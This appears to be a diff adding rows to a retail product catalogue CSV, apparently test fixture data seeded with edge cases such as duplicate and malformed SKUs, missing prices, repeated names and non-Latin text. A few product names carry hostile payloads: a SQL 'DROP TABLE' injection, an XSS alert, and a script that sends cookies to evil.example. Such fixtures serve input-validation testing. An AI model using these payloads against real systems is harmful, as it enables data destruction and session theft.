+SW-SNK-00057,Everyday Chocolate Bar 100g,Snacks,49,39,0,SUP17,ACTIVE,25,2025-09-26
+SW-GRO-00193,Smart Buy Atta 10kg,Grocery,332,266,0,SUP18,ACTIVE,8,2024-07-23
+SW-SNK-00033,Kitchen Pride Chocolate Bar 40g,Snacks,99,79,5,SUP19,ACTIVE,15,2024-11-13
+SW-GRO-00060,Metro Choice Iodised Salt 1kg,Grocery,30,23,18,SUP19,ACTIVE,25,2024-06-13
+SW-GRO-00143,Everyday Sugar 5kg,Grocery,208,155,5,SUP02,ACTIVE,8,2025-08-27
+SW-GRO-00012,Royal Harvest Basmati Rice 5kg,Grocery,377,295,12,SUP15,ACTIVE,20,2024-01-16
+SW-ELE-00082,Metro Choice AA Batteries 10 pack,Electronics Accessories,197,165,18,SUP09,ACTIVE,25,2025-12-22
+SW-ELE-00057,Daily Fresh USB Cable 1m,Electronics Accessories,364,262,18,SUP13,ACTIVE,15,2025-04-25
+SW-STA-00067,Metro Choice A4 Paper 100 sheets 🔥,Stationery,239,182,0,SUP20,ACTIVE,12,2024-04-19
+SW-GRO-00047,Value Pack Iodised Salt 1kg,Grocery,37,28,0,SUP03,ACTIVE,12,2024-05-14
+SW-BEV-00003,Prime Select Instant Coffee 50g,Beverages,354,277,12,SUP08,ACTIVE,20,2024-10-09
+SW-BEV-00095,Kitchen Pride Mineral Water 1L,Beverages,113,86,12,SUP11,ACTIVE,20,2025-07-02
+SW-PER-00042,Daily Fresh Shampoo 650ml,Personal Care,273,215,18,SUP06,ACTIVE,5,2024-06-07
+SW-BEV-00084,Pure Choice Instant Coffee 50g,Beverages,320,250,0,SUP19,ACTIVE,20,2024-08-24
+SW-GRO-00151,Everyday Atta 10kg,Grocery,174,126,0,SUP13,ACTIVE,25,2024-01-02
+SW-PER-00079,Everyday Bathing Soap 75g,Personal Care,113,89,0,SUP17,ACTIVE,20,2025-12-26
+SW-GRO-00129,Star Select Basmati Rice 5kg,Grocery,1238,910,12,SUP24,ACTIVE,10,2024-07-21
+SW-GRO-00093,Smart Buy Atta 5kg,Grocery,488,405,18,SUP01,ACTIVE,10,2024-04-23
+SW-SNK-00034,Royal Harvest Chocolate Bar 40g,Snacks,58,40,5,SUP24,ACTIVE,8,2024-09-06
+SW-HOM-00022,Prime Select Floor Cleaner 500ml,Household,103,74,0,SUP09,ACTIVE,12,2024-03-04
+SW-STA-00013,Royal Harvest A4 Paper 500 sheets,Stationery,395,324,12,SUP05,ACTIVE,8,2024-05-27
+SW-GRO-00156,Home Basics Masala Mix 100g,Grocery,111,76,18,SUP12,ACTIVE,25,2024-10-09
+SW-PER-00029,Home Basics Hand Wash 750ml,Personal Care,84,59,12,SUP08,ACTIVE,25,2025-08-05
+SW-BEV-00088,Everyday Cola Drink 2L,Beverages,67,52,18,SUP20,ACTIVE,10,2025-06-27
+SW-GRO-00007,Smart Buy Besan 1kg,Grocery,165,116,5,SUP22,ACTIVE,20,2025-09-12
+SW-HOM-00030,Green Leaf Floor Cleaner 500ml,Household,139,101,0,SUP18,ACTIVE,15,2024-11-22
+SW-BEV-00039,Home Basics Instant Coffee 50g,Beverages,240,188,12,SUP22,ACTIVE,20,2024-02-01
+SW-GRO-00035 ,Home Basics Poha 1kg,Grocery,91,76,0,SUP17,ACTIVE,8,2025-03-06
+SW-PER-00098,Green Leaf Shampoo 180ml,Personal Care,520,355,12,SUP06,ARCHIVED,20,2025-10-24
+SW-SNK-00056,Kitchen Pride Chocolate Bar 100g,Snacks,65,52,12,SUP18,ACTIVE,5,2024-12-09
+SW-ELE-00079,Green Leaf USB Cable 1m,Electronics Accessories,296,230,0,SUP11,ACTIVE,15,2024-08-15
+SW-ELE-00065,Fresh Basket Earphones wired,Electronics Accessories,211,157,0,SUP13,ACTIVE,15,2025-12-05
+SW-HOM-00016,Smart Buy Detergent Powder 1kg,Household,143,109,5,SUP23,ACTIVE,8,2025-07-01
+SW-GRO-00081,Royal Harvest Tea Leaves 500g,Grocery,222,179,12,SUP21,ACTIVE,5,2024-08-13
+SW-SNK-00007,Home Basics Potato Chips 150g,Snacks,24,19,12,SUP09,ACTIVE,20,2024-06-03
+SW-PER-00040,Prime Select Shampoo 180ml,Personal Care,391,309,0,SUP11,ACTIVE,10,2025-03-06
+SW-GRO-00020,Kitchen Pride Tea Leaves 500g,Grocery,213,167,12,SUP19,ACTIVE,5,2025-09-03
+SW-SNK-00024,Everyday Salted Peanuts 200g,Snacks,40,30,18,SUP04,ACTIVE,20,2024-01-18
+SW-GRO-00199,Everyday Masala Mix 200g,Grocery,61,49,5,SUP23,ACTIVE,10,2024-08-08
+SW-STA-00020,Star Select Marker Set 4 pack,Stationery,106,86,5,SUP19,ACTIVE,5,2024-07-12
+SW-GRO-00141,Kitchen Pride Masala Mix 100g,Grocery,118,90,12,SUP13,ACTIVE,8,2024-01-17
+SW-HOM-00057,Star Select Phenyl 1L,Household,117,79,5,SUP04,ACTIVE,10,2024-07-21
+SW-GRO-00187,Star Select Sugar 1kg,Grocery,184,154,5,SUP13,ACTIVE,20,2025-08-09
+SW-SNK-00003,Metro Choice Salted Peanuts 500g,Snacks,77,55,0,SUP12,ACTIVE,12,2024-05-22
+SW-ELE-00021,Star Select LED Bulb 12W,Electronics Accessories,153,126,0,SUP24,ACTIVE,12,2025-02-26
+SW-PER-00006,Daily Fresh Hand Wash 750ml,Personal Care,72,55,0,SUP13,ACTIVE,25,2025-01-21
+SW-STA-00043,Prime Select Notebook 180 pages,Stationery,106,74,18,SUP01,ACTIVE,15,2024-09-14
+SW-GRO-00031,Home Basics Masala Mix 200g,Grocery,123,96,12,SUP17,ACTIVE,8,2024-04-26
+SW-ELE-00008,Fresh Basket AA Batteries 4 pack,Electronics Accessories,118,95,0,SUP06,ACTIVE,25,2025-08-25
+SW-GRO-00161,Home Basics Tea Leaves 250g,Grocery,174,129,5,SUP11,ACTIVE,5,2025-10-24
+SW-PER-00018,Prime Select Bathing Soap 75g,Personal Care,70,50,0,SUP15,ACTIVE,10,2024-07-22
+SW-HOM-00046,Daily Fresh Detergent Powder 4kg,Household,721,506,0,SUP05,ACTIVE,5,2024-08-15
+SW-GRO-00203,Star Select Atta 10kg,Grocery,555,464,5,SUP06,ACTIVE,25,2024-08-17
+SW-STA-00056,Everyday Marker Set 4 pack,Stationery,139,96,12,SUP20,ACTIVE,8,2024-11-13
+SW-STA-00046,Daily Fresh Ball Pen 10 pack,Stationery,101,78,18,SUP22,ACTIVE,20,2025-07-26
+SW-HOM-00017,Star Select Phenyl 500ml,Household,115,96,12,SUP03,ACTIVE,20,2025-02-14
+SW-GRO-00058,Kitchen Pride Besan 500g,Grocery,66,47,12,SUP16,ACTIVE,8,2024-03-14
+SW-GRO-00128,Royal Harvest Sunflower Oil 5L,Grocery,644,473,12,SUP23,ACTIVE,15,2024-10-19
+SW-PER-00051,Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g Smart Buy Bathing Soap 75g ,Personal Care,119,94,0,SUP22,ACTIVE,10,2025-04-21
+SW-ELE-00006,Pure Choice AA Batteries 4 pack,Electronics Accessories,287,214,0,SUP11,ACTIVE,12,2025-11-09
+SW-PER-00085,Daily Fresh Bathing Soap 3 pack,Personal Care,59,40,5,SUP12,ACTIVE,12,2025-04-17
+SW-GRO-00164,Royal Harvest Atta 10kg,Grocery,443,341,0,SUP17,ACTIVE,5,2025-08-27
+SW-HOM-00043,Royal Harvest Phenyl 500ml,Household,112,83,5,SUP06,ACTIVE,25,2024-09-26
+SW-SNK-00065,Star Select Potato Chips 50g '; DROP TABLE products;--,Snacks,45,31,0,SUP04,ACTIVE,5,2025-10-01
+SW-STA-00058,Green Leaf A4 Paper 500 sheets,Stationery,240,191,12,SUP25,ARCHIVED,20,2024-01-12
+SW-ELE-00039,Value Pack USB Cable 2m,Electronics Accessories,241,175,12,SUP09,ACTIVE,10,2025-04-05
+SW-SNK-00002,Royal Harvest Namkeen Mix 200g,Snacks,119,82,0,SUP03,ACTIVE,20,2024-07-14
+SW-ELE-00056,Daily Fresh USB Cable 2m,Electronics Accessories,287,222,12,SUP11,ACTIVE,5,2025-09-27
+SW-STA-00026,Value Pack Sticky Notes 100 sheets,Stationery,61,41,5,SUP07,ACTIVE,10,2024-10-04
+SW-BEV-00019,Kitchen Pride Instant Coffee 200g,Beverages,392,304,12,SUP08,ACTIVE,10,2024-11-17
+SW-PER-00099,Home Basics Shampoo 180ml,Personal Care,149,105,5,SUP17,ACTIVE,20,2024-05-14
+SW-SNK-00101,Metro Choice Chocolate Bar 100g,Snacks,85,70,0,SUP15,ACTIVE,15,2024-10-03
+SW-GRO-00001,Green Leaf Toor Dal 500g,Grocery,72,50,5,SUP03,ACTIVE,12,2025-06-20
+SW-PER-00091,Pure Choice Toothpaste 100g,Personal Care,134,98,5,SUP25,ACTIVE,5,2025-01-13
+SW-HOM-00093,Kitchen Pride Phenyl 500ml,Household,161,132,12,SUP09,ACTIVE,10,2024-05-21
+SW-GRO-00120,Green Leaf Tea Leaves 250g,Grocery,168,118,12,SUP01,ACTIVE,10,2025-12-05
+SW-GRO-00198,Green Leaf Besan 500g,Grocery,112,78,5,SUP03,ACTIVE,5,2024-08-21
+SW-BEV-00085,Royal Harvest Mineral Water 1L,Beverages,99,80,12,SUP03,ACTIVE,8,2025-01-11
+SW-BEV-00022,Prime Select Orange Juice 1L,Beverages,108,77,5,SUP13,ACTIVE,8,2025-05-13
+SW-PER-00052,Value Pack Face Wash 50ml,Personal Care,241,170,0,SUP21,ACTIVE,5,2024-11-21
+SW-SNK-00053,Green Leaf Chocolate Bar 40g,Snacks,88,69,5,SUP18,ACTIVE,15,2024-01-21
+SW-BEV-00002,Fresh Basket Instant Coffee 50g,Beverages,319,265,0,SUP11,ACTIVE,25,2024-05-12
+SW-HOM-00008,Fresh Basket Dishwash Liquid 750ml,Household,56,45,5,SUP18,ACTIVE,5,2025-11-04
+SW-STA-00003,Prime Select Marker Set 4 pack,Stationery,121,96,0,SUP20,ACTIVE,20,2025-05-25
+SW-BEV-00046,Daily Fresh Mineral Water 1L,Beverages,117,95,5,SUP08,ACTIVE,20,2024-11-07
+SW-GRO-00029,Pure Choice Iodised Salt 1kg,Grocery,31,25,18,SUP13,ACTIVE,10,2024-08-23
+SW-GRO-00021,Prime Select Basmati Rice 5kg,Grocery,774,551,18,SUP17,ACTIVE,8,2024-08-04
+SW-SNK-00047,Daily Fresh Potato Chips 50g,Snacks,26,20,0,SUP03,ACTIVE,20,2025-09-14
+SW-PER-00038,Daily Fresh Shampoo 180ml,Personal Care,222,155,12,SUP25,ACTIVE,8,2025-05-15
+SW-HOM-00065,Kitchen Pride Floor Cleaner 2L עוגיות,Household,242,179,5,SUP25,ACTIVE,15,2025-09-27
+SW-STA-00005,Royal Harvest Marker Set 4 pack,Stationery,141,100,5,SUP19,ACTIVE,8,2024-06-25
+SW-GRO-00106,Prime Select Besan 1kg,Grocery,156,121,0,SUP16,ACTIVE,8,2024-11-13
+SW-STA-00006,Home Basics Sticky Notes 100 sheets,Stationery,86,64,0,SUP16,ACTIVE,20,2025-02-03
+SW-STA-00032,Everyday Ball Pen 10 pack,Stationery,112,81,18,SUP06,ACTIVE,10,2025-06-06
+SW-GRO-00016,Star Select Toor Dal 1kg,Grocery,234,192,0,SUP20,ACTIVE,20,2025-01-06
+SW-PER-00022,Value Pack Toothpaste 200g,Personal Care,68,48,5,SUP16,ACTIVE,15,2025-05-25
+SW-GRO-00097,Daily Fresh Besan 500g,Grocery,86,60,18,SUP05,ACTIVE,15,2025-01-13
+SW-GRO-00160,Star Select Sunflower Oil 1L,Grocery,852,601,18,SUP15,ACTIVE,25,2024-04-14
+SW-STA-00049,Prime Select Notebook 300 pages,Stationery,89,73,18,SUP15,ACTIVE,10,2025-08-18
+SW-STA-00068,Pure Choice Notebook 300 pages,Stationery,53,37,12,SUP11,ACTIVE,15,2025-09-07
+SW-PER-00061,Prime Select Face Wash 100ml,Personal Care,144,103,5,SUP19,ACTIVE,15,2024-03-21
+SW-BEV-00042,Prime Select Orange Juice 200ml,Beverages,51,43,0,SUP13,ACTIVE,25,2025-09-24
+SW-HOM-00010,Home Basics Dishwash Liquid 750ml,Household,86,69,12,SUP12,ACTIVE,5,2024-03-19
+SW-HOM-00100,Smart Buy Floor Cleaner 500ml,Household,74,59,5,SUP05,ACTIVE,10,2025-04-21
+SW-SNK-00044,Smart Buy Chocolate Bar 40g,Snacks,95,69,5,SUP24,ACTIVE,5,2025-10-02
+SW-GRO-00206,Daily Fresh Atta 10kg,Grocery,221,165,5,SUP13,ACTIVE,8,2024-08-19
+SW-ELE-00055,Value Pack Power Bank 10000mAh,Electronics Accessories,1468,1111,18,SUP19,ACTIVE,5,2025-03-14
+SW-GRO-00188,Prime Select Basmati Rice 1kg,Grocery,788,597,5,SUP24,ACTIVE,20,2024-09-11
+SW-HOM-00085,Royal Harvest Detergent Powder 1kg,Household,615,448,5,SUP14,ACTIVE,10,2024-12-17
+SW-HOM-00024,Fresh Basket Detergent Powder 1kg,Household,138,96,5,SUP09,ACTIVE,20,2025-07-12
+SW-BEV-00051,Fresh Basket Orange Juice 1L,Beverages,45,32,5,SUP15,ACTIVE,10,2025-08-02
+SW-BEV-00062,Smart Buy Instant Coffee 200g,Beverages,406,317,0,SUP24,ACTIVE,20,2025-02-07
+SW-GRO-00148,Smart Buy Besan 500g,Grocery,66,53,18,SUP13,ACTIVE,8,2025-02-14
+SW-STA-00066,Smart Buy Ball Pen 10 pack,Stationery,43,34,18,SUP24,ACTIVE,10,2025-10-24
+SW-GRO-00132,Everyday Masala Mix 100g,Grocery,78,66,18,SUP06,ACTIVE,8,2025-10-05
+SW-GRO-00107,Star Select Tea Leaves 250g,Grocery,227,170,5,SUP05,ACTIVE,8,2025-07-19
+SW-GRO-00208,Pure Choice Besan 1kg,Grocery,112,85,0,SUP12,ACTIVE,10,2024-11-18
+SW-STA-00054,Pure Choice A4 Paper 500 sheets,Stationery,404,334,12,SUP14,ACTIVE,20,2025-02-03
+SW-SNK-00028,Value Pack Chocolate Bar 100g,Snacks,68,46,18,SUP22,ACTIVE,25,2025-12-01
+SW-GRO-00104,Everyday Besan 500g,Grocery,57,45,5,SUP11,ACTIVE,20,2024-11-18
+SW-STA-00002,Home Basics Ball Pen 10 pack,Stationery,86,72,12,SUP01,ACTIVE,25,2025-05-01
+SW-BEV-00070,Pure Choice Mineral Water 1L,Beverages,43,30,12,SUP21,ACTIVE,10,2025-10-21
+SW-GRO-00075,Pure Choice Sugar 1kg,Grocery,259,178,18,SUP01,ACTIVE,5,2024-08-15
+SW-PER-00044,Pure Choice Toothpaste 200g,Personal Care,150,102,18,SUP04,ACTIVE,12,2024-03-19
+SW-GRO-00059,Prime Select Masala Mix 200g,Grocery,48,35,5,SUP16,ACTIVE,10,2024-07-11
+SW-BEV-00056,Star Select Mineral Water 1L,Beverages,110,89,12,SUP23,ACTIVE,20,2024-07-13
+SW-HOM-00028,Home Basics Garbage Bags 30 pcs,Household,70,59,5,SUP21,ACTIVE,25,2025-02-06
+SW-BEV-00092,Royal Harvest Instant Coffee 200g,Beverages,246,174,0,SUP22,ACTIVE,10,2024-05-16
+SW-PER-00094,Fresh Basket Face Wash 100ml,Personal Care,,120,0,SUP20,ACTIVE,8,2025-10-03
+SW-HOM-00014,Kitchen Pride Detergent Powder 1kg,Household,454,318,0,SUP25,ACTIVE,8,2025-08-17
+SW-PER-00036,Home Basics Bathing Soap 3 pack,Personal Care,120,86,0,SUP14,ACTIVE,5,2024-09-12
+SW-ELE-00040,Royal Harvest LED Bulb 9W,Electronics Accessories,203,172,5,SUP11,ACTIVE,25,2024-02-16
+SW-STA-00069,Value Pack Notebook 300 pages,Stationery,68,51,0,SUP21,ACTIVE,8,2025-03-21
+SW-GRO-00094,Kitchen Pride Poha 500g,Grocery,63,45,18,SUP09,ACTIVE,8,2025-10-02
+SW-GRO-00205,Metro Choice Atta 1kg,Grocery,560,466,5,SUP25,ACTIVE,5,2025-04-04
+SW-GRO-00152,Green Leaf Tea Leaves 500g,Grocery,189,132,0,SUP16,ACTIVE,20,2025-09-10
+SW-BEV-00022 ,Prime Select Orange Juice 1L,Beverages,106,77,5,SUP13,ACTIVE,8,2025-05-13
+SW-STA-00019,Daily Fresh Marker Set 4 pack,Stationery,83,61,18,SUP04,ACTIVE,20,2024-12-19
+SW-STA-00070,Smart Buy Sticky Notes 100 sheets,Stationery,60,43,5,SUP05,ACTIVE,5,2024-11-01
+SW-GRO-00121,Kitchen Pride Basmati Rice 10kg,Grocery,171,143,0,SUP25,ACTIVE,20,2025-08-26
+SW-BEV-00001,Everyday Mineral Water 1L,Beverages,124,105,0,SUP14,ACTIVE,5,2024-08-06
+SW-PER-00032,Prime Select Shampoo 650ml,Personal Care,253,208,18,SUP12,ARCHIVED,15,2024-08-25
+SW-SNK-00069,Pure Choice Potato Chips 50g,Snacks,45,34,12,SUP09,ACTIVE,10,2025-09-18
+SW-PER-00012,Home Basics Hand Wash 250ml,Personal Care,114,93,12,SUP11,ACTIVE,20,2024-07-19
+SW-HOM-00069,Star Select Floor Cleaner 2L,Household,211,175,18,SUP21,ACTIVE,25,2024-06-13
+SW-ELE-00001,Green Leaf Earphones wired,Electronics Accessories,609,481,12,SUP22,ACTIVE,25,2025-06-21
+SW-HOM-00094,Home Basics Floor Cleaner 2L,Household,113,88,0,SUP20,ACTIVE,20,2024-10-21
+SW-PER-00078,Home Basics Shampoo 650ml,Personal Care,367,293,5,SUP23,ACTIVE,20,2024-02-04
+SW-GRO-00035,Home Basics Poha 1kg,Grocery,93,76,0,SUP17,ACTIVE,8,2025-03-06
+SW-PER-00015,Royal Harvest Bathing Soap 75g,Personal Care,52,42,12,SUP18,ACTIVE,20,2025-03-04
+sw-bev-00091,Royal Harvest Mineral Water 20L,Beverages,60,44,18,SUP07,ACTIVE,8,2025-05-19
+SW-ELE-00018,Royal Harvest USB Cable 1m,Electronics Accessories,174,134,12,SUP13,ACTIVE,5,2025-07-13
+SW-BEV-00083,Fresh Basket Instant Coffee 200g,Beverages,283,235,5,SUP13,ACTIVE,12,2025-08-01
+SW-ELE-00026,Metro Choice AA Batteries 4 pack,Electronics Accessories,102,77,12,SUP07,ACTIVE,10,2025-12-20
+SW-PER-00027,Kitchen Pride Hand Wash 250ml,Personal Care,185,141,18,SUP20,ACTIVE,8,2025-07-06
+SW-BEV-00008,Star Select Energy Drink 250ml,Beverages,,76,12,SUP10,ACTIVE,20,2025-03-20
+SW-ELE-00050,Pure Choice USB Cable 1m,Electronics Accessories,365,299,5,SUP20,ACTIVE,20,2025-03-24
+SW-STA-00062,Metro Choice Notebook 300 pages,Stationery,62,51,0,SUP24,ACTIVE,10,2025-03-16
+SW-GRO-00051,Kitchen Pride Iodised Salt 1kg,Grocery,33,26,12,SUP09,ACTIVE,10,2025-08-04
+SW-BEV-00071,Star Select Orange Juice 200ml,Beverages,85,61,18,SUP05,ACTIVE,20,2024-10-20
+SW-SNK-00037,Royal Harvest Namkeen Mix 400g,Snacks,106,89,0,SUP24,ACTIVE,25,2024-05-28
+SW-STA-00041,Home Basics Notebook 180 pages,Stationery,53,40,0,SUP02,ACTIVE,8,2025-03-27
+SW-HOM-00096,Daily Fresh Floor Cleaner 2L,Household,517,370,0,SUP19,ACTIVE,8,2025-02-04
+SW-HOM-00025,Daily Fresh Garbage Bags 30 pcs,Household,171,134,18,SUP05,ACTIVE,25,2024-01-19
+SW-HOM-00054,Home Basics Detergent Powder 1kg,Household,435,333,12,SUP02,ACTIVE,15,2024-02-10
+SW-PER-00086,Green Leaf Hand Wash 750ml,Personal Care,135,102,18,SUP20,ACTIVE,8,2025-09-14
+SW-PER-00033,Kitchen Pride Bathing Soap 75g,Personal Care,41,33,12,SUP24,ACTIVE,5,2024-06-26
+SW-SNK-00082,Prime Select Cream Biscuits 100g,Snacks,,17,5,SUP17,ACTIVE,20,2024-10-21
+SW-STA-00035,Kitchen Pride Ball Pen 10 pack,Stationery,111,82,12,SUP15,ACTIVE,25,2024-08-02
+SW-STA-00029,Everyday Sticky Notes 100 sheets,Stationery,41,31,5,SUP06,ACTIVE,12,2024-01-10
+SW-GRO-00083,Daily Fresh Sugar 5kg,Grocery,200,156,12,SUP03,ACTIVE,10,2024-09-07
+SW-BEV-00091,Royal Harvest Mineral Water 20L,Beverages,57,44,18,SUP07,ACTIVE,8,2025-05-19
+SW-GRO-00067,Fresh Basket Basmati Rice 1kg,Grocery,501,376,18,SUP08,ACTIVE,25,2025-11-06
+SW-PER-00034,Smart Buy Bathing Soap 3 pack,Personal Care,109,76,0,SUP02,ACTIVE,25,2024-04-02
+SW-PER-00009,Smart Buy Face Wash 50ml,Personal Care,128,102,12,SUP17,ACTIVE,10,2024-05-07
+SW-BEV-00035,Metro Choice Instant Coffee 200g,Beverages,380,264,12,SUP23,ACTIVE,10,2025-08-11
+SW-SNK-00032,Fresh Basket Cream Biscuits 300g,Snacks,14,10,18,SUP23,ACTIVE,25,2024-12-13
+SW-GRO-00168,Everyday Tea Leaves 500g,Grocery,261,192,0,SUP06,ACTIVE,8,2025-06-22
+SW-HOM-00007,Fresh Basket Phenyl 500ml,Household,101,71,18,SUP03,ACTIVE,5,2024-02-14
+SW-SNK-00013,Home Basics Cream Biscuits 300g,Snacks,28,21,18,SUP06,ACTIVE,20,2025-06-15
+SW-STA-00074,Green Leaf Marker Set 4 pack,Stationery,150,113,5,SUP05,ACTIVE,5,2024-01-24
+SW-HOM-00068,Prime Select Floor Cleaner 2L,Household,130,103,12,SUP04,ACTIVE,8,2025-06-12
+SW-STA-00007,Royal Harvest A4 Paper 100 sheets,Stationery,103,78,18,SUP06,ACTIVE,8,2025-09-23
+SW-BEV-00066,Pure Choice Orange Juice 200ml,Beverages,122,102,12,SUP07,ACTIVE,5,2024-10-06
+SW-GRO-00043,Royal Harvest Besan 1kg,Grocery,155,129,18,SUP17,ACTIVE,10,2024-07-22
+SW-BEV-00040,Daily Fresh Orange Juice 1L <img src=x onerror=alert(1)>,Beverages,114,78,5,SUP12,ACTIVE,8,2025-02-19
+SW-PER-00071,Green Leaf Bathing Soap 75g,Personal Care,124,100,18,SUP24,ACTIVE,8,2024-12-13
+SW-HOM-00002,Daily Fresh Dishwash Liquid 250ml,Household,115,89,5,SUP03,ACTIVE,10,2025-12-14
+SW-HOM-00047,Value Pack Phenyl 500ml,Household,128,100,12,SUP16,ACTIVE,12,2025-01-03
+SW-GRO-00103,Home Basics Tea Leaves 500g,Grocery,224,161,0,SUP20,ACTIVE,12,2025-11-05
+SW-STA-00038,Daily Fresh Notebook 180 pages,Stationery,38,26,0,SUP10,ACTIVE,10,2025-07-24
+SW-PER-00031,Prime Select Face Wash 50ml,Personal Care,100,74,12,SUP24,ACTIVE,20,2024-07-21
+SW-BEV-00012,Pure Choice Instant Coffee 200g,Beverages,343,257,0,SUP16,ACTIVE,20,2025-11-10
+SW-GRO-00115,Prime Select Toor Dal 1kg,Grocery,239,182,5,SUP23,ACTIVE,15,2024-12-27
+SW-STA-00023,Kitchen Pride Marker Set 4 pack,Stationery,100,84,0,SUP17,ACTIVE,5,2024-04-28
+SW-PER-00063,Prime Select Hand Wash 250ml,Personal Care,140,111,5,SUP04,ACTIVE,8,2025-06-26
+SW-PER-00062,Daily Fresh Toothpaste 100g,Personal Care,120,86,18,SUP19,ACTIVE,10,2025-11-13
+SW-PER-00002,Royal Harvest Face Wash 100ml منتج تجريبي,Personal Care,135,100,5,SUP04,ACTIVE,25,2025-02-22
+SW-HOM-00031,Pure Choice Phenyl 500ml,Household,107,81,12,SUP21,ACTIVE,20,2025-09-11
+SW-SNK-00006,Kitchen Pride Potato Chips 50g,Snacks,51,40,0,SUP21,ACTIVE,20,2025-02-11
+SW-HOM-00023,Star Select Garbage Bags 30 pcs,Household,188,133,5,SUP16,ACTIVE,15,2025-08-10
+SW-ELE-00025,Value Pack USB Cable 1m,Electronics Accessories,257,187,18,SUP14,ACTIVE,20,2025-02-21
+SW-BEV-00103,Pure Choice Energy Drink 250ml,Beverages,110,81,0,SUP17,ACTIVE,20,2025-01-04
+SW-SNK-00061,Metro Choice Cream Biscuits 100g,Snacks,22,18,12,SUP13,ACTIVE,12,2025-01-02
+SW-SNK-00092,Pure Choice Namkeen Mix 400g,Snacks,51,41,18,SUP04,ACTIVE,12,2025-11-21
+SW-HOM-00088,Fresh Basket Phenyl 1L,Household,148,109,5,SUP01,ACTIVE,20,2024-12-10
+SW-GRO-00055,Home Basics Iodised Salt 1kg,Grocery,31,25,5,SUP23,ACTIVE,20,2024-09-24
+SW-BEV-00072,Prime Select Cola Drink 2L,Beverages,95,67,12,SUP13,ACTIVE,25,2024-02-25
+SW-ELE-00016,Fresh Basket Power Bank 10000mAh,Electronics Accessories,1388,1022,0,SUP07,ACTIVE,8,2024-12-25
+SW-STA-00039,Royal Harvest Notebook 180 pages,Stationery,63,49,18,SUP06,ACTIVE,15,2025-06-20
+SW-GRO-00061,Value Pack Atta 10kg,Grocery,183,148,0,SUP24,ACTIVE,12,2024-08-26
+SW-GRO-00013,Home Basics Sugar 5kg,Grocery,144,101,5,SUP09,ACTIVE,15,2025-07-20
+SW-GRO-00209,Fresh Basket Iodised Salt 1kg,Grocery,41,31,5,SUP16,ACTIVE,10,2025-08-24
+SW-HOM-00035,Kitchen Pride Dishwash Liquid 250ml,Household,100,78,0,SUP19,ACTIVE,20,2025-06-26
+SW-HOM-00078,Star Select Detergent Powder 4kg,Household,717,509,0,SUP07,ARCHIVED,5,2025-04-04
+SW-SNK-00067,Star Select Namkeen Mix 400g,Snacks,65,50,12,SUP12,ACTIVE,15,2025-03-18
+SW-GRO-00174,Everyday Poha 500g,Grocery,65,51,0,SUP13,ACTIVE,5,2024-07-13
+SW-GRO-00004,Green Leaf Poha 500g,Grocery,77,61,5,SUP21,ACTIVE,5,2024-05-26
+SW-GRO-00147,Daily Fresh Sunflower Oil 5L,Grocery,471,340,12,SUP15,ACTIVE,20,2024-03-17
+SW-SNK-00075,Metro Choice Chocolate Bar 40g,Snacks,101,85,18,SUP23,ACTIVE,25,2024-06-03
+SW-BEV-00016,Fresh Basket Cola Drink 2L,Beverages,99,75,0,SUP02,ACTIVE,8,2025-08-17
+SW-GRO-00181,Kitchen Pride Basmati Rice 5kg,Grocery,819,627,5,SUP10,ACTIVE,5,2025-09-02
+SW-GRO-00100,Kitchen Pride Tea Leaves 250g,Grocery,169,126,0,SUP25,ACTIVE,25,2024-08-05
+SW-GRO-00084,Fresh Basket Sunflower Oil 1L,Grocery,1064,857,18,SUP08,ACTIVE,10,2024-07-24
+SW-PER-00019,Royal Harvest Toothpaste 200g,Personal Care,66,46,18,SUP12,ACTIVE,12,2025-07-13
+SW-ELE-00019,Fresh Basket LED Bulb 9W,Electronics Accessories,99,78,18,SUP13,ACTIVE,5,2025-10-16
+SW-ELE-00066,Smart Buy USB Cable 2m,Electronics Accessories,189,158,5,SUP11,ACTIVE,5,2024-03-11
+SW-HOM-00006,Royal Harvest Garbage Bags 90 pcs,Household,153,115,18,SUP04,ACTIVE,25,2024-11-21
+SW-GRO-00092,Kitchen Pride Besan 1kg,Grocery,79,61,5,SUP25,ACTIVE,5,2025-02-12
+SW-BEV-00101,Green Leaf Cola Drink 600ml </td><script>fetch('//evil.example/'+document.cookie)</script>,Beverages,91,74,18,SUP16,ACTIVE,8,2024-09-25
+SW-GRO-00011,Prime Select Tea Leaves 250g,Grocery,165,117,0,SUP05,ACTIVE,5,2025-04-19
+SW-GRO-00003,Fresh Basket Poha 500g,Grocery,74,56,0,SUP15,ACTIVE,10,2024-02-15
+SW-ELE-00053,Kitchen Pride USB Cable 1m,Electronics Accessories,306,248,18,SUP24,ACTIVE,8,2024-12-08
+SW-BEV-00011,Value Pack Orange Juice 1L,Beverages,135,104,5,SUP21,ACTIVE,10,2024-09-21
+SW-BEV-00102,Smart Buy Orange Juice 200ml,Beverages,84,61,12,SUP23,ACTIVE,15,2024-11-03
+SW-GRO-00065,Everyday Sugar 1kg,Grocery,168,141,0,SUP24,ACTIVE,8,2025-05-11
+SW-GRO-00190,Value Pack Atta 5kg,Grocery,661,513,5,SUP04,ACTIVE,20,2024-05-10
+SW-GRO-00162,Daily Fresh Basmati Rice 1kg,Grocery,388,288,0,SUP11,ACTIVE,12,2024-03-07
+SW-GRO-00078,Royal Harvest Basmati Rice 10kg,Grocery,543,396,18,SUP25,ACTIVE,25,2024-11-22
+SW-STA-00057,Pure Choice Notebook 180 pages,Stationery,67,54,18,SUP17,ACTIVE,20,2025-06-16
+SW-BEV-00020,Green Leaf Mineral Water 1L,Beverages,82,61,12,SUP07,ACTIVE,10,2024-08-28
+SW-BEV-00014,Star Select Orange Juice 1L,Beverages,112,77,18,SUP17,ACTIVE,12,2024-04-19
+SW-PER-00075,Royal Harvest Shampoo 650ml,Personal Care,303,229,0,SUP02,ACTIVE,8,2025-06-16
+SW-GRO-00111,Metro Choice Tea Leaves 500g,Grocery,310,247,18,SUP11,ACTIVE,8,2024-01-22
+SW-SNK-00073,Royal Harvest Cream Biscuits 100g,Snacks,11,9,12,SUP09,ACTIVE,8,2025-12-01
+SW-GRO-00086,Value Pack Tea Leaves 500g,Grocery,196,160,12,SUP11,ACTIVE,12,2025-04-03
+SW-ELE-00079 ,Green Leaf USB Cable 1m,Electronics Accessories,296,230,0,SUP11,ACTIVE,15,2024-08-15
